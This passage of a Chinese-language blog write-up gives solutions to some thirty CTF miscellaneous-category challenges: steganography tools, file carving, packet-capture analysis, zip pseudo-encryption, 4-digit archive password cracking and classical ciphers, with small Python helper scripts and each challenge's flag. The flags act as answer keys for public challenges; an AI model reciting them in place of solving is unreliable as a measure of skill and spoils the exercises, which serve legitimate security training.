，逐个尝试。<br>最终在第3个修改后成功解压文件。<br>解压出来是一个jpg和一个zip，zip里有flag的文件，需要密码。猜测密码与图片有关。<br>通过上面其它已知办法没法找到密码。于是在网上搜索，了解到一个steghide工具。可以找出图片中的隐写文件。<br>在kali下使用该工具，安装命令为：<br><code>apt-get install steghide</code><br>安装好后，使用命令找出该jpg图片的隐写文件：<br><code>steghide extract -sf good.jpg</code><br>提示需要密码，直接空密码回车<br>得到一个ko.txt文件，打开看得到密码。<br>拿到zip解压，得到flag.txt<br>打开flag文件得到flag：<br><code>flag&#123;1RTo8w@&amp;4nK@z*XL&#125;</code></p><h1 id="33-被劫持的神秘礼物"><a href="#33-被劫持的神秘礼物" class="headerlink" title="33 - 被劫持的神秘礼物"></a>33 - 被劫持的神秘礼物</h1><p>打开百度网盘，得到一个pcapng文件<br>根据题目描述需要找到用户名和密码，那么一般url里有login字段，并且是post方式提交。<br>顺利找到了HTTP包后，翻找字段，得到了用户名和密码，进行md532位小写加密，即可得到答案。</p><h1 id="34-BJDCTF2020-认真你就输了"><a href="#34-BJDCTF2020-认真你就输了" class="headerlink" title="34 - [BJDCTF2020]认真你就输了"></a>34 - [BJDCTF2020]认真你就输了</h1><p>打开rar压缩包，是一个10文件夹，然后里面是一个xls格式的文件。<br>尝试打开，发现显示格式与扩展名不匹配，强制打开是一堆乱码。然后查找互联网，按照网上所说的方式修改注册表。<br>修改注册表后打开，仍然是一堆乱码。<br>通过“格式与扩展名不匹配”和乱码中出现的flag.txt字段，感觉该文件原本不是xls文件。<br>于是修改了扩展名为zip<br>解压后找到flag.txt<br>打开即可得到flag：<br><code>flag&#123;M9eVfi2Pcs#&#125;</code></p><h1 id="35-BJDCTF2020-藏藏藏"><a href="#35-BJDCTF2020-藏藏藏" class="headerlink" title="35 - [BJDCTF2020]藏藏藏"></a>35 - [BJDCTF2020]藏藏藏</h1><p>打开rar压缩包，是一个jpg图片，猜测其中混杂了其它文件，使用binwalk和foremost进行了文件分离。<br>分离出了一个zip，然后解压打开，发现一个二维码。使用QR_Research<br>得到flag：<br><code>flag&#123;you are the best!&#125;</code></p><h1 id="36-被偷走的文件"><a href="#36-被偷走的文件" class="headerlink" title="36 - 被偷走的文件"></a>36 - 被偷走的文件</h1><p>打开zip压缩包，是一个pcapng文件<br>然后使用wireshark打开，进行流量分析，发现ftp协议传输有一个RAR文件。<br>于是使用binwalk和foremost分离文件，得到一个rar文件<br>文件有密码，使用4位纯数字爆破，成功得到flag.txt<br><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p><h1 id="37-刷新过的图片"><a href="#37-刷新过的图片" class="headerlink" title="37 - 刷新过的图片"></a>37 - 刷新过的图片</h1><p>这道题花了2个小时，原因是涉及到新知识，最主要的是出了意料之外的岔子。<br>容我细细讲来。<br>首先题目提示的刷新，那么首先想到的是F5，但是通过F5怎么也没得到flag。<br>于是查了下资料，了解到原来有名为F5隐写的知识。涉及到F5隐写需要使用F5-steganography工具。<br>本来在物理机上git clone了一下，以为很容易解决了。但是却出现了报错。<br>我并不想研究错误的原因，于是在kali上尝试，竟然也出现了同样的报错。<br>这下我不得不研究原因了，搜索了一下发现，原来是这个F5-steganography工具使用了一个名为sun的方法，而这个方法正好在jdk16及以上的版本中不支持了。看了下物理机的jdk版本16，kali的jdk版本17。<br>无奈之下，换了另一台虚拟机Ubuntu，发现它的jdk版本是11，这下我大喜过望，正当以为能解决的时候。<br>发现ssh又连不上，这次的原因并非是ssh未启动，而是22端口未开放。本来我也想到是这个原因，但问题在于我忘记了Ubuntu的防火墙命令，只记得一个另外的firewalld和iptables。最后在网上查了下资料发现命令是ufw。<br>于是我把22端口开放。然后ssh成功连接。<br>正当我以为万事大吉，结果发现无法上传文件。试了好几次都不行，于是采用了网上的方式，使用rz命令。<br>安装rz需要root权限，但是我却发现密码不对。root密码居然和开机密码不同，于是我只好改了密码。<br>然后终于能在xshell里使用rz命令，上传了Misc.jpg图片，安装F5-steganography工具。解决了另外一些小问题。使用了命令：<br><code>java Extract Misc.jpg</code><br>得到了output.txt<br>将其下载到物理机，打开看到PK字段，推测是zip文件，将文件扩展名改为zip，需要密码，打开010editor查看是伪加密。<br>最终拿到了flag.txt<br><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p><h1 id="38-GXYCTF2019-佛系青年"><a href="#38-GXYCTF2019-佛系青年" class="headerlink" title="38 - [GXYCTF2019]佛系青年"></a>38 - [GXYCTF2019]佛系青年</h1><p>zip文件是伪加密，直接修改即可。<br>然后拿到fo.txt，打开以看是与佛论禅的加密。<br>于是直接搜索在线加解密的与佛论禅。<br>直接得到flag<br><code>flag&#123;w0_fo_ci_Be1&#125;</code></p><h1 id="39-BJDCTF2020-你猜我是个啥"><a href="#39-BJDCTF2020-你猜我是个啥" class="headerlink" title="39 - [BJDCTF2020]你猜我是个啥"></a>39 - [BJDCTF2020]你猜我是个啥</h1><p>将文件下载，是一个zip，但实际不是zip文件，打开010editor，发现是一个png文件，改为png之后，是一个二维码。<br>使用QR_Research工具发现flag不在。再次打开010editor，发现文件底部有flag<br><code>flag&#123;i_am_fl@g&#125;</code></p><h1 id="40-snake"><a href="#40-snake" class="headerlink" title="40 - snake"></a>40 - snake</h1><p>打开压缩文件，得到一个jpg，通过010editor查看，得知jpg中混杂了其它文件。<br>使用binwalk和foremost分离文件，得到zip<br>解压zip，得到cipher和key两个文件。<br>先打开key这个文件，是一个base64编码，解码得到：<br><code>What is Nicki Minaj&#39;s favorite song that refers to snakes?</code><br>网上搜了下，得到密钥为anaconda(必须全小写)<br>然后，由于snake的另一个同义词是serpent<br>serpent是一种加密方式。<br>于是找到这个加解密网站：<a href="http://serpent.online-domain-tools.com/">Serpent – Symmetric Ciphers Online</a><br>将文件上传，使用密钥，模式为ECB<br>最终得到flag，整理得：<br><code>flag&#123;who_knew_serpent_cipher_existed&#125;</code></p><p>这种题还是挺难的，难在需要联想到蛇的另一个单词是一种加解密的方式。不过也更符合真实场景。</p><h1 id="41-秘密文件"><a href="#41-秘密文件" class="headerlink" title="41 - 秘密文件"></a>41 - 秘密文件</h1><p>本题解法和第36题一模一样。不过多赘述。</p><h1 id="42-BJDCTF2020-just-a-rar"><a href="#42-BJDCTF2020-just-a-rar" class="headerlink" title="42 - [BJDCTF2020]just_a_rar"></a>42 - [BJDCTF2020]just_a_rar</h1><p>打开rar文件，还是一个rar，提示4位数，直接使用ARCHPR工具爆破4位纯数字，得到密码2016<br>密码得到后解压得到flag.jpg<br>打开010editor粗略看了一眼，以为是文件分离，但是实际操作发现不是。<br>再仔细看了下，原来flag藏在了16进制的中间，即可得：<br><code>flag&#123;Wadf_123&#125;</code></p><h1 id="43-BJDCTF2020-鸡你太美"><a href="#43-BJDCTF2020-鸡你太美" class="headerlink" title="43 - [BJDCTF2020]鸡你太美"></a>43 - [BJDCTF2020]鸡你太美</h1><p>打开rar文件，得到两个gif，其中一个能打开，一个不能，不能打开得gif通过010editor查看，发现缺少了gif文件头，添加上文件头后，即可出现flag<br><code>flag&#123;zhi_yin_you_are_beautiful&#125;</code></p><h1 id="44-菜刀666"><a href="#44-菜刀666" class="headerlink" title="44 - 菜刀666"></a>44 - 菜刀666</h1><p>打开rar文件，得到一个pcapng文件<br>使用wireshark工具打开，分析流量，找到一个最大的HTTP数据包，然后follow HTTP Stream<br>发现了其中含有大量16进制数据，查看开头结尾，发现是一个jpg格式文件。<br>拿到在线网站转文件，得到一个jpg<br>找到了密码（一开始我把密码当成是flag了，尴尬）：<br><code>Th1s_1s_p4sswd_!!!</code></p><p>然后发现pcapng里有一个zip文件，拿去foremost分离<br>得到一个zip，需要密码，就是之前发现的那个。解压后拿到flag：<br><code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code></p><h1 id="45-BJDCTF2020-一叶障目"><a href="#45-BJDCTF2020-一叶障目" class="headerlink" title="45 - [BJDCTF2020]一叶障目"></a>45 - [BJDCTF2020]一叶障目</h1><p>使用010editor打开，修改了一下宽高，发现图片有变化，说明需要改为原来的宽高。<br>使用网上找的CRC修复脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">file = <span class="string">&#x27;1.png&#x27;</span>  <span class="comment">#注意，1.png图片要和脚本在同一个文件夹下哦~</span></span><br><span class="line">fr = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="built_in">str</span>(fr[<span class="number">29</span>:<span class="number">33</span>]).replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&#x27;0x&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#crc32key = 0xCBD6DF8A #补上0x，copy hex value</span></span><br><span class="line"><span class="comment">#data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)  #hex下copy grep hex</span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            <span class="comment">#写文件</span></span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="comment">#保存副本</span></span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br></pre></td></tr></table></figure><p>将脚本与图片置于同一文件夹下，即可得到原来的图片，拿到flag：<br><code>flag&#123;66666&#125;</code></p><h1 id="46-SWPU2019-神奇的二维码"><a href="#46-SWPU2019-神奇的二维码" class="headerlink" title="46 - [SWPU2019]神奇的二维码"></a>46 - [SWPU2019]神奇的二维码</h1><p>打开压缩文件，是一个二维码，首先用QR Research工具扫描二维码，发现flag不在。<br>然后拿去分离，foremost分离不了，用binwalk分离，命令是：<br><code>binwalk -e BitcoinPay.png --run-as=root</code><br>得到几个rar，doc，jpg，txt文件。<br>分别打开，看到比较可疑的是18394.rar文件，设有密码，无法打开。查看文件头，确实是rar文件。但是无法爆破。<br>打开encode.txt，一个base64编码，解码后是一串无效数字。然后打开flag.doc的文件，里面是base64编码了很多次字符串。<br>使用python脚本对base64解码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">s</span>):</span><br><span class="line">    n=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = base64.b64decode(s)</span><br><span class="line">            n+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Base64共decode了&#123;0&#125;次，最终结果如下：&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(s,<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;base64.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    decode(f)</span><br></pre></td></tr></table></figure><p>解码得到真正的rar文件的密码，打开得到mp3文件。<br>mp3文件使用Audacity工具打开，发现是摩尔斯电码：<br><code>-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--</code></p><p>解密得到flag：<br><code>flag&#123;morseisveryveryeasy&#125;</code></p><h1 id="47-BJDCTF2020-纳尼"><a href="#47-BJDCTF2020-纳尼" class="headerlink" title="47 - [BJDCTF2020]纳尼"></a>47 - [BJDCTF2020]纳尼</h1><p>打开rar文件，发现是一个gif和txt。txt文件提示gif文件打不开<br>那么通过010Editor工具打开gif文件，发现缺少了文件头。<br>添加上文件头后能打开gif，显示了一个base64编码的字符串：<br><code>Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=</code><br>解码后得到flag：<br><code>flag&#123;wang_bao_qiang_is_sad&#125;</code></p><h1 id="48-梅花香之苦寒来"><a href="#48-梅花香之苦寒来" class="headerlink" title="48 - 梅花香之苦寒来"></a>48 - 梅花香之苦寒来</h1><p>打开压缩文件，得到一个文件夹，里面有一个jpg文件。<br>使用010editor工具打开，发现图片数据之后有一大串16进制数据。将16进制数据复制到在线网站直接转为txt文件。<br>打开txt文件发现是一系列二维坐标。<br>那么根据提示是需要二维坐标绘图，在Linux下使用gnuplot工具，使用这个工具需要把坐标转化为 <code>A B</code> 的形式，直接把 <code>(A,B)</code> 替换即可。<br>需要下载(之前网上某个教程居然叫下压缩包自己编译，又麻烦又容易出错，简直蠢到家了)，直接使用命令即可：<br><code>apt-get install gnuplot</code><br>绘制出二维码，然后截图保存为二维码的png文件，拿到QR Research识别。得到flag：<br><code>flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</code></p><p>这道题也花了不少时间，一个小时左右。主要一开始不想用Linux的这个gnuplot工具，觉得麻烦。为此去试了下python的绘图工具，但出错了。兜兜转转还是选择了这个。<br>很烦欸。</p><h1 id="49-HBNIS2018-excel破解"><a href="#49-HBNIS2018-excel破解" class="headerlink" title="49 - [HBNIS2018]excel破解"></a>49 - [HBNIS2018]excel破解</h1><p>直接拿到010editor，搜索flag，结束：<br><code>flag&#123;office_easy_cracked&#125;</code></p><h1 id="50-穿越时空的思念"><a href="#50-穿越时空的思念" class="headerlink" title="50 - 穿越时空的思念"></a>50 - 穿越时空的思念</h1><p>下载了一段mp3，打开一听明显是摩尔斯电码，但是用Audacity工具打开发现音频有问题，这里不再演示。<br>这个题解不错，推荐一下：<a href="https://www.cnblogs.com/tac2664/p/13861595.html">题解</a><br>用Audacity工具将音频完全转化为右声道，这样就只有摩尔斯电码的声音了。<br>然后导出为wav文件，拿到kali使用morse2ascii工具: <code>morse2ascii xxx.wav</code><br>顺带一提morse2ascii工具在kali下安装方法: <code>apt-get install morse2ascii</code><br>flag：<br><code>flag&#123;f029bd6f551139eedeb8e45a175b0786&#125;</code></p><h1 id="51-HBNIS2018-来题中等的吧"><a href="#51-HBNIS2018-来题中等的吧" class="headerlink" title="51 - [HBNIS2018]来题中等的吧"></a>51 - [HBNIS2018]来题中等的吧</h1><p>打开压缩文件，得到一个png<br>从png看是一个摩尔斯电码：<br><code>.- .-.. .--. .... .- .-.. .- -...</code><br>得到：<br><code>flag&#123;alphalab&#125;</code></p><h1 id="52-ACTF新生赛2020-outguess"><a href="#52-ACTF新生赛2020-outguess" class="headerlink" title="52 - [ACTF新生赛2020]outguess"></a>52 - [ACTF新生赛2020]outguess</h1><p>打开压缩文件，得到一个jpg，一个txt和一个zip文件。<br>txt无有效信息，jpg的属性里面有一个：<br><code>公正民主公正文明公正和谐</code><br>是社会主义核心价值观加解密，拿去解密得到：<br><code>abc</code><br>结合题目可知是outguess工具图片隐写。<br>在kali下使用命令安装outguess：<br><code>apt install outguess</code><br>outguess解密：<br><code>outguess -k &quot;abc&quot; -r mmm.jpg input.txt</code><br>打开txt文件，flag整理得：<br><code>flag&#123;gue33_Gu3Ss!2020&#125;</code></p><h1 id="53-谁赢了比赛？"><a href="#53-谁赢了比赛？" class="headerlink" title="53 - 谁赢了比赛？"></a>53 - 谁赢了比赛？</h1><p>打开压缩包，得到一张包含围棋棋谱的png<br>一开始以为是什么棋谱之类的加密，但后来发现不是。<br>拿去使用binwalk和foremost分离文件。<br>然后得到一个rar文件。<br>发现需要密码，使用4位纯数字爆破，得到密码1020<br>打开rar文件，得到一个txt和gif文件，txt文件里无有效信息。<br>使用Stegsolve工具，用Frame Browser将gif逐帧播放，发现第310帧有一串文字，将这一帧文件保存为bmp文件。<br>再用Stegsolve工具打开bmp文件，在Red 0通道发现了二维码。使用QR Research读取到flag：<br><code>flag&#123;shanxiajingwu_won_the_game&#125;</code></p><h1 id="54-WUSTCTF2020-find-me"><a href="#54-WUSTCTF2020-find-me" class="headerlink" title="54 - [WUSTCTF2020]find_me"></a>54 - [WUSTCTF2020]find_me</h1><p>从属性栏找到以下盲文：<br><code>⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=</code><br>解密得：<br><code>wctf2020&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</code><br>整理flag得：<br><code>flag&#123;y$0$u_f$1$n$d$_M$e$e$e$e$e&#125;</code></p><h1 id="55-SWPU2019-我有一只马里奥"><a href="#55-SWPU2019-我有一只马里奥" class="headerlink" title="55 - [SWPU2019]我有一只马里奥"></a>55 - [SWPU2019]我有一只马里奥</h1><p>打开压缩文件，得到一个exe文件，点击exe文件，得到一个1.txt<br>打开txt文件，得到提示信息：<br><code>ntfs      flag.txt</code><br>那么搜索ntfs相关的工具，得到NtfsStreamEditor工具，下载后打开：<br>设置路径为exe存在的目录，得到flag.txt文件。然后导出该文件。<br>打开flag.txt文件，得到flag：<br><code>flag&#123;ddg_is_cute&#125;</code></p><h1 id="56-GUET-CTF2019-KO"><a href="#56-GUET-CTF2019-KO" class="headerlink" title="56 - [GUET-CTF2019]KO"></a>56 - [GUET-CTF2019]KO</h1><p>使用 <a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook!</a> 可得到flag:<br><code>flag&#123;welcome to CTF&#125;</code></p><h1 id="57-GXYCTF2019-gakki"><a href="#57-GXYCTF2019-gakki" class="headerlink" title="57 - [GXYCTF2019]gakki"></a>57 - [GXYCTF2019]gakki</h1><p>打开压缩包得到一张jpg，010editor查看发现有文件附加，直接用foremost分离得到rar文件<br>然后使用ARCHPR工具4位纯数字爆破，得到密码8864<br>然后得到flag.txt，打开一看是完全无序的字符，一开始以为是什么文件，做成了16进制文件发现并不是。<br>思考良久后，使用了频率统计的方式。<br>可以随便找一个在线网站频率统计，也可以用python写一个频率统计的脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">counts = strings.count(i)</span><br><span class="line">i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">result[i] = counts</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到：<br><code>GXY&#123;gaki_IsMyw1fe&#125;</code><br>整理得：<br><code>flag&#123;gaki_IsMyw1fe&#125;</code></p><h1 id="58-ACTF新生赛2020-base64隐写"><a href="#58-ACTF新生赛2020-base64隐写" class="headerlink" title="58 - [ACTF新生赛2020]base64隐写"></a>58 - [ACTF新生赛2020]base64隐写</h1><p>打开压缩包得到一个tar文件，解压得到两个zip，将 近在眼前.zip 再解压得到一个png和一个txt，png是公众号二维码无用，txt全是base64编码的数据。<br>看出来应该是base64隐写类型。<br>那么在网上找了个python脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ComeOn!.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="built_in">str</span>(line, <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        rowb64 = <span class="built_in">str</span>(base64.b64encode(base64.b64decode(stegb64)), <span class="string">&quot;utf-8&quot;</span>).strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]) - b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># flag += chr(int(bin(offset)[2:].zfill(equalnum * 2), 2))</span></span><br><span class="line">            <span class="comment"># print(flag) 这样写得不出正确结果</span></span><br><span class="line">        <span class="built_in">print</span>([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><p>用脚本跑了一遍得到了flag：<br><code>flag&#123;6aseb4_f33!&#125;</code></p><h1 id="59-MRCTF2020-ezmisc"><a href="#59-MRCTF2020-ezmisc" class="headerlink" title="59 - [MRCTF2020]ezmisc"></a>59 - [MRCTF2020]ezmisc</h1><p>打开压缩包得到一个png<br>打开图片感觉是一个修改了宽高的图片，用010editor工具修改宽高，图片有明显变化，于是继续修改宽高，得到flag：<br><code>flag&#123;1ts_vEryyyyyy_ez!&#125;</code></p><h1 id="60-caesar"><a href="#60-caesar" class="headerlink" title="60 - caesar"></a>60 - caesar</h1><p>打开txt文件，得到描述信息：<br><code>gmbhjtdbftbs</code><br>由于题目是caesar，中文意思为凯撒<br>那么明显是凯撒加密<br>那么使用在线工具解密，偏移量为1<br>得到flag：<br><code>flag&#123;flagiscaesar&#125;</code></p><h1 id="61-SWPU2019-伟大的侦探"><a href="#61-SWPU2019-伟大的侦探" class="headerlink" title="61 - [SWPU2019]伟大的侦探"></a>61 - [SWPU2019]伟大的侦探</h1><p>打开压缩文件，发现需要密码才能打开misc文件夹，而txt文件不需要，所以直接解压出txt文件。<br>然后txt文件打开，发现需要更改编码才能看到正确的密码，于是打开010editor工具，在右下角改编码为EBCDIC<br>得到正确的密码：<br><code>wllm_is_the_best_team!</code><br>然后成功解压出misc文件夹，里面是18张jpg文件，是跳舞小人，福尔摩斯中的加解密方式。<br>于是搜索对应的密码表，分别一一对应，得到flag：<br><code>flag&#123;iloveholmesandwllm&#125; </code></p><h1 id="62-黑客帝国"><a href="#62-黑客帝国" class="headerlink" title="62 - 黑客帝国"></a>62 - 黑客帝国</h1><p>打开压缩文件，得到一个txt文件。打开是大量的字符，看起来没什么规律，但是仔细看开头 <code>52 61 72 21</code> 。这是rar文件头，于是使用在线工具将16进制转为文件，得到一个rar。<br>rar文件有密码，用ARCHPR工具4位数字爆破，得到了密码。<br>打开rar文件，是一个png文件，但是打不开。<br>使用010editor工具仔细看，发现并不是png文件，而是jpg文件，将文件头前4位改为 <code>FF D8 FF E0</code><br>再将文件扩展名改为jpg<br>打开拿到flag：<br><code>flag&#123;57cd4cfd4e07505b98048ca106132125&#125;</code></p><h1 id="63-HBNIS2018-低个头"><a href="#63-HBNIS2018-低个头" class="headerlink" title="63 - [HBNIS2018]低个头"></a>63 - [HBNIS2018]低个头</h1><p>考得很妙。<br>打开txt文件，得到密文：<br><code>EWAZX RTY TGB IJN IO KL</code><br>低个头，指看键盘。<br>得到flag：<br><code>flag&#123;CTF&#125;</code></p><h1 id="64-MRCTF2020-你能看懂音符吗"><a href="#64-MRCTF2020-你能看懂音符吗" class="headerlink" title="64 - [MRCTF2020]你能看懂音符吗"></a>64 - [MRCTF2020]你能看懂音符吗</h1><p>下载了压缩文件后，发现格式不正确，打开010editor工具，发现文件头有误，修改为rar正确的文件头: <code>52 61 72 21</code><br>rar文件能够正常打开，得到一个docx文件。发现格式不对，使用010editor工具，发现文件头是 <code>50 4B 03 04</code><br>这是zip文件头，于是把文件扩展名修改为zip，打开得到一些xml和其它文件。<br>逐个打开查看，在word文件夹下的document.xml文件，用浏览器打开，发现音符，使用在线音符解密，得到：<br><code>MRCTF&#123;thEse_n0tes_ArE_am@zing~&#125;</code><br>整理flag：<br><code>flag&#123;thEse_n0tes_ArE_am@zing~&#125;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;MISC杂项的学习。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="MISC杂项" scheme="http://example.com/categories/CTF/MISC%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
